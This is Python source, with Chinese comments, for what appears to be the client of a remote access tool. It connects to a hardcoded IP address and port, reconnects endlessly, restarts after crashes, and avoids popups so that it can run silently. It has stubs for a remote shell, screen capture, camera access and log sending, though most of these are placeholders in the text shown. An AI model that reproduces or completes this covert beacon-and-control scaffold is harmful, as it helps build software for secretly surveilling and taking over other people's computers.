import json
import os
import random
import datetime
import logging
import socket
import time as time_module
from typing import Optional
from threading import Lock, Thread
from time import sleep
from os.path import isfile, abspath
from subprocess import Popen, PIPE, STDOUT

# --- 原有导入保留 (如果不需要某些功能可以注释掉以减小体积) ---
# 注意：为了静默运行，建议尽量减少 GUI 相关的库依赖
try:
    import psutil as _psutil
    _HAS_PSUTIL = True
except ImportError:
    _HAS_PSUTIL = False

# 假设这些是你自定义的模块，请确保它们在同级目录下
# from packets import * 
# from dxcampil import create as create_camera

# --- 配置日志系统 (替代 print) ---
# 日志将写入 'client.log'，不会有任何弹窗
logging.basicConfig(
    filename='client.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_info(msg):
    logging.info(msg)

def log_error(msg):
    logging.error(msg)

# --- 模拟缺失的常量 (实际使用时请从你的 packets 模块导入) ---
HOST_NAME = "hostname"
ScreenFormat = type('ScreenFormat', (), {'JPEG': 'jpeg'})

config_data = {}
DEFAULT_HOST = "154.36.164.157"
DEFAULT_PORT = 6111
reconnect_time = 2

class ClientStopped(BaseException):
    pass

def load_config() -> None:
    global config_data
    config_path = abspath("config.json")
    if isfile(config_path):
        try:
            with open(config_path, 'r') as f:
                config_data = json.load(f)
            return
        except Exception as e:
            log_error(f"读取配置失败: {e}")
    config_data = {"host": DEFAULT_HOST, "port": DEFAULT_PORT}

def start_and_return(target, args=()):
    """辅助函数：启动线程"""
    t = Thread(target=target, args=args)
    t.daemon = True # 设置为守护线程，主程序退出时自动退出
    t.start()
    return t

class Client:
    def __init__(self, config: dict) -> None:
        self.host = config.get("host") if config.get("host") else DEFAULT_HOST
        self.port = config.get("port") if config.get("port") else DEFAULT_PORT
        
        # 网络初始化
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5) # 增加超时设置，防止阻塞
        except Exception as e:
            log_error(f"Socket初始化失败: {e}")
            self.sock = None

        self.log_stack = {}
        self.__connected = False
        self.threads: list[Thread] = []
        
        # --- 屏幕与外设相关 (静默模式下建议禁用或做异常保护) ---
        self.sending_screen = False
        self.screen_fps = 15
        self.camera = None 
        # try:
        #     self.camera = create_camera() # 如果没有摄像头可能会报错，建议注释
        # except:
        #     pass
            
        self.shell: Popen = None
        # self.packet_manager = PacketManager(self.connected) # 需确保 PacketManager 已定义
        
        log_info(f"客户端初始化完成: {self.host}:{self.port}")

    def connect_until(self):
        """简单的重连逻辑示例"""
        while not self.__connected:
            try:
                if self.sock:
                    self.sock.connect((self.host, self.port))
                    self.__connected = True
                    log_info("连接服务器成功")
            except Exception as e:
                log_error(f"连接失败，重试中...: {e}")
                sleep(reconnect_time)

    @property
    def connected(self):
        return self.__connected

    @connected.setter
    def connected(self, val):
        self.__connected = val

    def send_packet(self, packet):
        """发送数据包占位符"""
        if not self.connected: return
        try:
            # 这里需要填入你实际的序列化发送逻辑
            # data = json.dumps(packet).encode()
            # self.sock.sendall(data)
            pass
        except Exception as e:
            log_error(f"发送数据出错: {e}")
            self.connected = False

    def recv_packet(self):
        """接收数据包占位符"""
        # 这里需要填入你实际的接收逻辑
        # 必须返回 length, packet
        return 0, None

    def parse_packet(self, packet):
        """解析数据包占位符"""
        return True

    def get_screen_packet(self):
        return {"type": "screen_info"}

    # --- 线程任务 ---
    
    def shell_output_thread(self):
        while self.connected:
            sleep(1)

    def log_send_thread(self):
        while self.connected:
            # 模拟日志发送循环
            sleep(10)

    def packet_send_thread(self):
        while self.connected:
            sleep(0.1)

    def screen_send_thread(self):
        # 原代码包含屏幕截图，在无头模式下极易报错，建议直接留空或极度简化
        while self.connected:
            sleep(1)

    def connection_init(self):
        # 模拟握手
        pass

    def start(self) -> None:
        log_info("=== 客户端服务启动 ===")
        
        # 确保有 socket
        if not self.sock:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.connect_until()
            
            # 启动后台线程
            # 注意：如果 shell 或 screen 功能不需要，不要启动相关线程
            start_and_return(self.shell_output_thread)
            start_and_return(self.log_send_thread)
            start_and_return(self.packet_send_thread)
            start_and_return(self.connection_init)
            # start_and_return(self.screen_send_thread) # 建议禁用屏幕传输以防报错

            # 主循环
            while self.connected:
                try:
                    # 这里的逻辑需要根据你的 PacketManager 实际情况调整
                    # 如果只是保持连接，可以用简单的 recv
                    length, packet = self.recv_packet()
                    
                    if packet is None:
                        sleep(0.01)
                        continue
                        
                    # log_info(f"收到包: {packet.get('type')}") # 避免日志写太频繁
                    
                    if not self.parse_packet(packet):
                        raise ClientStopped
                
                except (ConnectionError, OSError) as e:
                    log_error(f"连接断开: {e}")
                    self.connected = False
                except ClientStopped:
                    log_info("收到停止指令")
                    break
                except Exception as e:
                    log_error(f"主循环未知错误: {e}")
                    self.connected = False

        except Exception as e:
            log_error(f"启动过程发生严重错误: {e}")
        finally:
            log_info("客户端正在关闭...")
            # 清理资源
            if self.sock: self.sock.close()

def main():
    load_config()
    client = Client(config_data)
    
    # 增加一层最外层的 try-except 防止脚本直接崩溃退出
    while True:
        try:
            client.start()
        except Exception as e:
            log_error(f"主进程崩溃: {e}")
            sleep(5) # 崩溃后等待5秒重启

if __name__ == "__main__":
    main()
